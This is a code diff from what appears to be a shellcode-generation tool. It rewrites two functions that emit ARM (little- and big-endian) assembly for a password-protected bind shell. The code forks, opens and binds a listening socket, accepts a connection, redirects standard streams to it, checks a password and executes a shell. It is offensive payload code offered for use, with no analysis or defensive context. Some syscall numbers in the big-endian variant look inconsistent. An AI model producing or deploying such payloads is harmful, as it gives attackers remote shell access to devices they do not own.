@@ -2163,7 +2163,11 @@ def armelv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	else:
 		envp = my_package.get_envir_args(envp)
 
-	shellcode += shellcraft.fork()
+	shellcode += """
+	mov     r7, #2
+	svc     0x900002
+
+	"""
 
 	shellcode += '''
 	mov r11,r0
@@ -2178,10 +2182,9 @@ def armelv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
     /* call socket() */
     mov r7, #0xff /* 0x119 */
     add r7,r7,0x1a
-    svc  #0
+    svc  0x900119
 	'''
 
-	shellcode
 
 	shellcode += '''
 	mov r6, r0
@@ -2195,7 +2198,7 @@ def armelv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	/* call setsockopt() */
 	mov r7, #0xff
 	add r7, r7,#39
-	svc  0
+	svc  0x900126
 	'''
 
 	shellcode += '''
@@ -2209,31 +2212,31 @@ def armelv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	mov  r2,#0x10  
 	mov r7,#0xff
 	add r7,r7,0x1b
-	svc #0
+	svc 0x90011a
 	mov r0,r6
 	eor r1,r1
 	mov r7,#0xff
 	add r7,r7,29
-	svc #0
+	svc 0x90011c
 	mov r0,r6
 	eor r2,r2
 	mov r7, #0xff
 	add r7,r7,30
-	svc #0
+	svc 0x90011d
 	mov r6,r0
 
 	mov r1,#2
 	mov r0,r6
 	mov r7,#63
-	svc #0
+	svc 0x90003f
 	sub r1, r1, #1
 	mov r0, r6
 	mov r7,#63
-	svc #0
+	svc 0x90003f
 	sub r1, r1, #1
 	mov r0, r6
 	mov r7, 63
-	svc #0
+	svc 0x90003f
 
 
 
@@ -2259,13 +2262,13 @@ def armelv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	mov  r2, #8
 	/* call write() */
 	mov r7, #SYS_write /* 4 */
-	svc  #0
+	svc  0x900004
 	sub  sp, 0x20
 	mov  r0, r6
 	mov  r1, sp
 	mov  r2, #%s
 	mov  r7, #3
-	svc  #0
+	svc  0x900003
 	mov  r7,sp
 	ldr  r1,[r7]
 	'''
@@ -2283,7 +2286,7 @@ def armelv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #0
+	svc 0x90000b
 	'''
 	shellcode = shellcode % (passwd_len)
 
@@ -2291,12 +2294,25 @@ def armelv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 main_exit:
 	'''
 
-	shellcode += shellcraft.exit(0)
+	shellcode += """
+	eor     r0, r0, r0
+	mov     r7, #1
+	svc     0x900000
+
+	"""
 	shellcode += '''
 main_lab:
 	'''
 
-	shellcode += shellcraft.wait4("r11")
+	shellcode += """
+	mov     r0, fp
+	eor     r1, r1, r1
+	eor     r2, r2, r2
+	eor     r3, r3, r3
+	mov     r7, #114
+	svc     0x900072
+
+	"""
 
 	shellcode += '''
 b main
@@ -2469,7 +2485,11 @@ def armebv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	else:
 		envp = my_package.get_envir_args(envp)
 
-	shellcode += shellcraft.fork()
+	shellcode += """
+	mov     r7, #2
+	svc     0x900000
+
+	"""
 
 	shellcode += '''
 	mov r11,r0
@@ -2483,7 +2503,7 @@ def armebv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
     eor  r2, r2 ,r2/* 0 (#0) */
     mov r7, #0xff /* 0x119 */
     add r7,r7,0x1a
-    svc  #0
+    svc 0x900119
 	'''
 
 	shellcode += '''
@@ -2497,7 +2517,7 @@ def armebv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	mov  r4, #4
 	/* call setsockopt() */
 	mov r7, #SYS_setsockopt /* 0x126 */
-	svc  0
+	svc 0x900126
 
 	'''
 
@@ -2515,31 +2535,31 @@ def armebv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	mov  r2,#0x10  
 	mov r7,#0xff
 	add r7,r7,0x1b
-	svc #0
+	svc 0x90011a
 	mov r0,r6
 	eor r1,r1
 	mov r7,#0xff
 	add r7,r7,29
-	svc #0
+	svc 0x90011c
 	mov r0,r6
 	eor r2,r2
 	mov r7, #0xff
 	add r7,r7,30
-	svc #0
+	svc 0x90011d 
 	mov r6,r0
 
 	mov r1,#2
 	mov r0,r6
 	mov r7,#63
-	svc #0
+	svc 0x90003f
 	sub r1, r1, #1
 	mov r0, r6
 	mov r7,#63
-	svc #0
+	svc 0x90003f
 	sub r1, r1, #1
 	mov r0, r6
 	mov r7, 63
-	svc #0
+	svc 0x90003f
 
 	mov r7,#0x20
 	strb r7,[sp,#-0x30]
@@ -2563,13 +2583,13 @@ def armebv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	mov  r2, #8
 	/* call write() */
 	mov r7, #SYS_write /* 4 */
-	svc  #0
+	svc  0x900004
 	sub  sp, 0x20
 	mov  r0, r6
 	mov  r1, sp
 	mov  r2, #%s
 	mov  r7, #3
-	svc  #0
+	svc  0x900003
 	mov  r7,sp
 	ldr  r1,[r7]
 	'''
@@ -2595,20 +2615,33 @@ def armebv5_power_bind_shell(shell_path ,listen_port, passwd, envp ,filename=Non
 	push {r0,r8}
 	mov r1,sp
 	mov r7,#0xb
-	svc #0
+	svc 0x90000b
 	'''
 
 	shellcode += '''
 	main_exit:
 	'''
 
-	shellcode += shellcraft.exit(0)
+	shellcode += """
+	eor     r0, r0, r0
+	mov     r7, #1
+	svc     0x900000
+
+	"""
 
 	shellcode += '''
 main_lab:
 	'''
 
-	shellcode += shellcraft.wait4("r11")
+	shellcode += """
+	mov     r0, fp
+	eor     r1, r1, r1
+	eor     r2, r2, r2
+	eor     r3, r3, r3
+	mov     r7, #114        ; 0x72
+	svc     0x900072
+
+	"""
 
 	shellcode += '''
 b main
